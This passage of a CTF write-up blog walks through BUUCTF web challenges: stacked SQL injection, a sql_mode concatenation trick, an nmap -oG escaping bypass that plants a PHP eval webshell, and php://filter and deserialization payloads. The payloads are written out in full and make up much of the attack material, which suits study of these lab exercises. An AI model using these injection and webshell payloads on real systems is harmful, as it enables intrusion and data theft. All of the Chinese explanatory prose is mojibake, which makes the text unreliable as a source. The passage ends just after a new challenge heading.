<h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®å¯ä»¥çœ‹åˆ°ä¸€ä¸ªæç¤ºæ¡†ï¼Œè¿›è¡Œæ³¨å…¥æµ‹è¯•ï¼Œ<code>1&#39;</code>çš„æ—¶å€™ä¸å›æ˜¾ï¼Œ<code>1&#39;#</code>åˆ™å›æ˜¾ï¼Œè¯´æ˜å­˜åœ¨sqlæ³¨å…¥ï¼Œ<code>order by</code>è¯­å¥å¾—çŸ¥æœ‰ä¸¤ä¸ªå­—æ®µï¼Œä½†æ˜¯ç”¨<code>union select</code>ç»„åˆæŸ¥è¯¢çš„æ—¶å€™æç¤ºäº†è¿‡æ»¤çš„æƒ…å†µï¼š<br><img src="" alt=""><br>å¯ä»¥çœ‹åˆ°ï¼Œå¸¸ç”¨çš„æ³¨å…¥è¯­å¥åŸºæœ¬å…¨è¢«è¿‡æ»¤äº†ï¼Œç½‘ä¸Šå‚è€ƒå¾—çŸ¥æ˜¯<code>å †å æ³¨å…¥</code>ã€‚</p>
<h3 id="è§£é¢˜-2"><a href="#è§£é¢˜-2" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>åˆ©ç”¨å †å æ³¨å…¥è¿›è¡Œæ³¨å…¥ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">çˆ†åº“ï¼š1';<span class="keyword">show</span> <span class="keyword">databases</span>;<span class="comment">#</span></span><br><span class="line">çˆ†è¡¨ï¼š1';<span class="keyword">show</span> <span class="keyword">tables</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>æŸ¥è¡¨å›æ˜¾çš„ç»“æœå¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web33.png" alt="">ã€‚<br>æˆ‘ä»¬çœ‹åˆ°æœ‰ä¸€ä¸ª<code>words</code>è¡¨å’Œä¸€ä¸ª<code>1919810931114514</code>è¡¨ï¼Œflagåº”è¯¥åœ¨<code>1919810931114514</code>ä¸­æ²¡é”™äº†ï¼Œçœ‹ä¸€ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span> //æ³¨æ„ä»¥çº¯æ•°å­—ä½œä¸ºè¡¨åï¼ŒæŸ¥è¡¨çš„æ—¶å€™éœ€è¦ç”¨åå¼•å·</span><br></pre></td></tr></table></figure>
<p><img src="http://www.ggb0n.cool/images/BUUCTF-web34.png" alt=""><br>ç°åœ¨ï¼Œæˆ‘ä»¬çŸ¥é“flagåœ¨<code>1919810931114514</code>è¡¨äº†ï¼Œä½†æ˜¯ç”¨å»æŸ¥è¯¢çš„å­—æ®µéƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥éœ€è¦ç”¨å…¶ä»–çš„æ–¹æ³•æ¥è·å–flagã€‚<br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è¾“å…¥<code>1</code>æˆ–è€…<code>2</code>çš„æ—¶å€™ï¼Œéƒ½ä¼šè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå› æ­¤çŒœæµ‹å†…éƒ¨æŸ¥è¯¢è¯­å¥åº”è¯¥æ˜¯é»˜è®¤åŒ¹é…<code>words</code>åº“çš„ï¼ŒæŸ¥è¯¢è¯­å¥ä¹Ÿå°±ç±»ä¼¼äº<code>select id, data from words where id =</code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æŠŠ<code>1919810931114514</code>è¡¨æ”¹åä¸º<code>words</code>è¡¨ï¼Œå¹¶ä¸”åŠ å…¥<code>id</code>åˆ—ï¼ŒåŒæ—¶å°†<code>flag</code>åˆ—æ”¹ä¸º<code>data</code>åˆ—ï¼Œå¦‚æ­¤ä¸€æ¥ï¼Œæˆ‘ä»¬æŸ¥è¯¢<code>1&#39; or 1=1#</code>å°±èƒ½æ‹¿åˆ°flagäº†ã€‚<br>æœ€ç»ˆæ„é€ payloadï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1â€™;<span class="keyword">rename</span> <span class="keyword">table</span> words <span class="keyword">to</span> word1;<span class="keyword">rename</span> <span class="keyword">table</span> <span class="number">1919810931114514</span> <span class="keyword">to</span> words;<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">add</span> <span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">unsigned</span> <span class="keyword">not</span> <span class="literal">Null</span> auto_increment primary <span class="keyword">key</span>; alert table words <span class="keyword">change</span> flag <span class="keyword">data</span> <span class="built_in">varchar</span>(<span class="number">100</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>ç„¶å<code>1&#39; or 1=1</code>å³å¯æ‹¿åˆ°flagã€‚</p>
<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>ä¹Ÿæ˜¯è€ƒå¯Ÿå †å æ³¨å…¥ï¼Œä½†æ˜¯ä¸ä¸Šé¢˜ä¸åŒï¼Œæœ¬é¢˜çªç ´ç‚¹åœ¨äºï¼š<strong>mysqlä¸­é€šè¿‡set sql_mode=PIPES_AS_CONCATå¯ä»¥å°†||è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œéæˆ–è¿ç®—ç¬¦</strong>ï¼Œåˆ©ç”¨è¯­å¥å †å è®¾ç½®è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œç„¶åå†é€šè¿‡<code>||</code>æ‹¼æ¥æŸ¥è¯¢flagå³å¯ã€‚</p>
<h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®ï¼Œå’Œä¸Šé¢˜ä¸€æ ·æ˜¯ä¸€ä¸ªæŸ¥è¯¢æ¡†ï¼Œå¯ä»¥æ‹¿åˆ°æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">    $post = <span class="keyword">array</span>();</span><br><span class="line">    $get = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">global</span> $MysqlLink;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//GetPara();</span></span><br><span class="line">    $MysqlLink = mysqli_connect(<span class="string">"localhost"</span>,$datauser,$datapass);</span><br><span class="line">    <span class="keyword">if</span>(!$MysqlLink)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Mysql Connect Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $selectDB = mysqli_select_db($MysqlLink,$dataName);</span><br><span class="line">    <span class="keyword">if</span>(!$selectDB)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Choose Database Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($v)&amp;&amp;is_string($v))&#123;</span><br><span class="line">            $post[$k] = trim(addslashes($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//die();</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you <span class="keyword">if</span> the flag is right. &lt;/ a&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"query"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">        $BlackList = <span class="string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span>;</span><br><span class="line">        <span class="comment">//var_dump(preg_match("/&#123;$BlackList&#125;/is",$post['query']));</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/&#123;$BlackList&#125;/is"</span>,$post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">            <span class="comment">//echo $post['query'];</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Nonono."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen($post[<span class="string">'query'</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Too long."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = <span class="string">"select "</span>.$post[<span class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                <span class="keyword">while</span>($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>çœ‹åˆ°    <code>mysql_multi_query()</code>å¾—çŸ¥å¯ä»¥å †å æ³¨å…¥ï¼Œè¿™é‡Œå…³æ³¨æŸ¥è¯¢è¯­å¥<code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code>å¯ä»¥çœ‹åˆ°ï¼ŒæŸ¥è¯¢è¯­å¥æ˜¯å°†æˆ‘ä»¬ä¼ å…¥çš„è¯­å¥ä¸<code>||flag from Flag</code>æ‹¼æ¥åœ¨ä¸€èµ·äº†ï¼Œè¿™é‡Œè¡¥å……çŸ¥è¯†ï¼š</p>
<ul>
<li>åœ¨oracle ç¼ºçœæ”¯æŒ é€šè¿‡ â€˜ || â€™ æ¥å®ç°å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œä½†åœ¨mysql ç¼ºçœä¸æ”¯æŒã€‚éœ€è¦è°ƒæ•´mysql çš„sql_modeæ¨¡å¼ï¼špipes_as_concat æ¥å®ç°oracle çš„ä¸€äº›åŠŸèƒ½ã€‚</li>
</ul>
<p>å› æ­¤æˆ‘ä»¬é€šè¿‡å †å æ³¨å…¥è®¾ç½®<code>sql_mode</code>ï¼Œç„¶åå†æŸ¥è¯¢å³å¯ã€‚</p>
<h3 id="è§£é¢˜-3"><a href="#è§£é¢˜-3" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>æ„é€ æœ€ç»ˆpayloadï¼š<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
<p>éé¢„æœŸè§£ï¼šç›´æ¥æ„é€ payloadä¸º<code>*,1</code>å³å¯æ‹¿åˆ°flag</p>
<ul>
<li>å­—ç¬¦ä¸²<code>æˆ–</code>æ—¶å‰é¢çš„æ•°å­—æ—¶ç»“æœä¸º<code>1</code>åˆ™è¿”å›<code>1</code>ï¼Œä¸º<code>0</code>åˆ™è¿”å›<code>0</code>ï¼Œæ•ˆæœè·Ÿç›´æ¥*ä¸€æ ·ã€‚</li>
</ul>
<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>è€ƒå¯Ÿ<code>namp</code>çš„ä¸€ä¸ªå‘½ä»¤<code>-oG</code>ï¼Œä»¥åŠ<code>escapeshellarg()</code>å’Œ<code>escapeshellarg()</code>å‡½æ•°åˆèµ·æ¥ä½¿ç”¨é€ æˆçš„æ¼æ´ã€‚</p>
<h3 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>é¦–å…ˆçœ‹åˆ°ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬çœ‹åˆ°ï¼Œä»£ç ä¸»è¦æ˜¯é€šè¿‡åˆ©ç”¨<code>nmap</code>çš„å‘½ä»¤æ‹¼æ¥ä¸Šæˆ‘ä»¬çš„è¾“å…¥æ¥æ‰§è¡Œï¼Œå‚è€ƒåˆ«äººçš„é¢˜è§£å¾—çŸ¥<code>namp</code>çš„ä¸€ä¸ªå‚æ•°<code>-oG</code>å¯ä»¥å‘ç›®æ ‡æœºå™¨ä¸­å†™å…¥æ–‡ä»¶ï¼Œé€šè¿‡è¿™ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥å‘ç›®æ ‡æœºå™¨å†™å…¥ä¸€ä¸ªå°é©¬æ¥è¿æ¥ã€‚<br>ä½†æ˜¯æˆ‘ä»¬åªèƒ½ä»<code>host</code>å‚æ•°æ¥å†™å…¥å†…å®¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†™å…¥çš„å°é©¬ä»£ç ä¾¿ä¼šè¢«<code>escapeshellarg()</code>å’Œ<code>escapeshellarg()</code>åšå¤„ç†ï¼Œå³å°†<code>host</code>ä¸­åŒ…å«çš„å­—ç¬¦è½¬ä¹‰ï¼Œä¾¿å¯ä»¥å½±å“å°é©¬çš„ä¸Šä¼ ï¼Œå› æ­¤éœ€è¦åˆ©ç”¨å®ƒä»¬ç»“åˆä½¿ç”¨å­˜åœ¨çš„æ¼æ´æ¥ç»•è¿‡ã€‚<br>è¿™é‡Œå¯ä»¥å‚è€ƒï¼š<a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a><br>å³ä¼ å…¥çš„å‚æ•°å†…å®¹ä¸­åŒ…å«<code>&#39;</code>åˆ™ä¼šé€ æˆæ¼æ´ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š<code>172.17.0.2&#39; -v -d a=1</code></li>
<li>ç»è¿‡<code>escapeshellarg</code>å¤„ç†åå˜æˆäº†<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚</li>
<li>ç»è¿‡<code>escapeshellcmd</code>å¤„ç†åå˜æˆ<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>ï¼Œè¿™æ˜¯å› ä¸º<code>escapeshellcmd</code>å¯¹<code>\</code>ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„<code>&#39;</code>è¿›è¡Œäº†è½¬ä¹‰</li>
<li>æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>ï¼Œç”±äºä¸­é—´çš„<code>\\</code>è¢«è§£é‡Šä¸º<code>\</code>è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„<code>&#39;</code>æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„<code>&#39;</code>é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸º<code>curl 172.17.0.2\ -v -d a=1&#39;</code>ï¼Œå³å‘<code>172.17.0.2\</code>å‘èµ·è¯·æ±‚ï¼Œ<code>POST</code>æ•°æ®ä¸º<code>a=1&#39;</code>ã€‚</li>
</ul>
<p>è¿™é‡Œæˆ‘ä»¬æ˜¯åˆ©ç”¨<code>namp</code>æ‰§è¡Œå‘½ä»¤ï¼Œé‚£ä¹ˆéœ€è¦äº†è§£ä¸€äº›<code>namp</code>çš„åŸºæœ¬çŸ¥è¯†ï¼š<code>namp -PS 127.0.0.1</code>ä¸<code>namp -PS &#39;&#39; 127.0.0.1</code>ä¸<code>nmap -PS &#39;&quot; &quot;&#39; 127.0.0.1 &quot; &quot;</code>æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚</p>
<h3 id="è§£é¢˜-4"><a href="#è§£é¢˜-4" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>æ„é€ payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?host=<span class="string">' &lt;?php @eval($_POST["hack"]);?&gt; -oG hack.php '</span></span><br></pre></td></tr></table></figure>
<p>å†™å…¥ä¹‹åè¿”å›äº†å°é©¬å­˜å‚¨çš„è·¯å¾„ï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web35.png" alt=""><br>ç„¶åå»èšå‰‘è¿æ¥å³å¯ã€‚</p>
<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>è€ƒå¯Ÿ<code>file_get_contents</code>çš„ç»•è¿‡ï¼Œä»¥åŠååºåˆ—åŒ–ã€‚<br>è¡¥å……çŸ¥è¯†ï¼š<code>file_get_contents</code>çš„ç»•è¿‡</p>
<blockquote>
<p>1ã€ä½¿ç”¨<code>php://input</code>ä¼ªåè®®ç»•è¿‡<br>  â‘ å°†è¦<code>GET</code>çš„å‚æ•°<code>?xxx=php://input</code><br>  â‘¡ç”¨<code>post</code>æ–¹æ³•ä¼ å…¥æƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼<br>2ã€ç”¨<code>data://</code>ä¼ªåè®®ç»•è¿‡<br>  â‘ å°†urlæ”¹ä¸ºï¼š<code>?xxx=data://text/plain;base64,æƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼çš„base64ç¼–ç </code><br>  â‘¡æˆ–è€…å°†urlæ”¹ä¸ºï¼š<code>?xxx=data:text/plain,(urlç¼–ç çš„å†…å®¹)</code><br>3ã€åˆ©ç”¨<code>è¿œç¨‹æ–‡ä»¶è¯»å–</code>ç»•è¿‡</p>
</blockquote>
<h3 id="é¢˜ç›®åˆ†æ-4"><a href="#é¢˜ç›®åˆ†æ-4" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®ä¹‹åï¼Œç»™å‡ºäº†ä¸€æ®µä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>é€šè¿‡å®¡è®¡ä»£ç å¯çŸ¥ï¼šéœ€è¦<code>GET</code>æ–¹å¼ä¸Šä¼ ä¸‰ä¸ªå‚æ•°<code>text</code>ã€<code>file</code>ã€<code>password</code>ï¼Œå¹¶ä¸”ä¸‰ä¸ªå‚æ•°éœ€è¦æ»¡è¶³ï¼š</p>
<ul>
<li><code>text</code>å‚æ•°ä¼ å…¥çš„å€¼ä¼šç”¨<code>file_get_contents</code>å»è®¿é—®ï¼Œåˆæ­¥çŒœæµ‹æ˜¯<code>è¿œç¨‹æ–‡ä»¶è¯»å–</code>ï¼Œåæ¥æµ‹è¯•å‘ç°è¿™é‡Œä¸è¡Œï¼Œéœ€è¦ç”¨ä¼ªåè®®ï¼›</li>
<li><code>file</code>å‚æ•°å¯ä»¥ä¼ å…¥æ–‡ä»¶åï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šè¢«<code>include()</code>åŒ…å«ï¼Œçœ‹åˆ°è¿™çŒœæµ‹è‚¯å®šæœ‰æ–‡ä»¶åŒ…å«ï¼Œå¹¶ä¸”æç¤ºäº†<code>useless.php</code>ï¼Œè‚¯å®šæ˜¯è¦çœ‹å®ƒçš„ä»£ç çš„ï¼›</li>
<li><code>password</code>ä¼šè¿›è¡Œååºåˆ—åŒ–ï¼Œè¿˜æ²¡çœ‹å‡ºä»–çš„ç”¨å¤„ã€‚</li>
</ul>
<h3 id="è§£é¢˜-5"><a href="#è§£é¢˜-5" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>é¦–å…ˆæ„é€ payloadï¼š</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">/?<span class="attribute">text</span>=data:text/plain,welcome <span class="keyword">to</span> the zjctf&amp;<span class="attribute">file</span>=php://filter/convert.base64-encode/resource=useless.php&amp;passwprd=1</span><br></pre></td></tr></table></figure>
<p>æˆåŠŸè¯»å–åˆ°<code>useless.php</code>çš„ä»£ç ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬çœ‹åˆ°ï¼Œè¿™é‡Œæ„é€ äº†ä¸€ä¸ª<code>Flag</code>ç±»ï¼Œå¹¶ä¸”åœ¨æ­¤å¤„å¯ä»¥è¯»åˆ°<code>flag.php</code>çš„å†…å®¹ï¼Œç”±æ­¤å¾—çŸ¥<code>password</code>ä¼ å…¥çš„è‚¯å®šæ˜¯æ­¤å¤„åºåˆ—åŒ–çš„å†…å®¹ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„ä»£ç æ‹¿åˆ°åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">"flag.php"</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Flag;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶åå†æ„é€ payloadè¯»å–flagï¼š</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">/?<span class="built_in">text</span>=data:<span class="built_in">text</span>/plain,welcome <span class="keyword">to</span> <span class="keyword">the</span> zjctf&amp;<span class="built_in">file</span>=useless.php&amp;password=O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹æºç æ‹¿åˆ°flagã€‚<br><img src="http://www.ggb0n.cool/images/BUUCTF-web41.png" alt=""></p>
<h2 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><p>æ˜¯ä¸Šé“é¢˜çš„æ”¹ç‰ˆï¼ŒåŸé¢˜æ˜¯æ”¯æŒ<code>è¿œç¨‹æ–‡ä»¶è¯»å–</code>çš„ï¼Œä½†æ˜¯æ”¾åˆ°<code>BUU</code>ä¸Šå¥½åƒä¸è¡Œäº†â€¦ è¿™é“é¢˜åœ¨ä¸Šé“é¢˜çš„åŸºç¡€ä¸Šè€ƒäº†<code>preg_replace()</code>çš„RCEã€‚<br>æœ¬RCEå‚è€ƒï¼š<a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
<h3 id="é¢˜ç›®åˆ†æ-5"><a href="#é¢˜ç›®åˆ†æ-5" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>é¦–å…ˆçœ‹ä»£ç ï¼š</p>
